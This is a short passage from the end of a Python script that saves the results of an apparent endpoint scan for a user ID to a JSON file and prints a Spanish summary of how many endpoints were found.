    filename = f"bigo_fullscan_v5_{user_id}.json"
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(result, f, indent=2, ensure_ascii=False, default=str)
    
    print(f"\n  📁 Resultados guardados en: {filename}")
    print(f"  📁 {len(result['endpoints']['encontrados'])} endpoints encontrados")


if __name__ == "__main__":
    main()
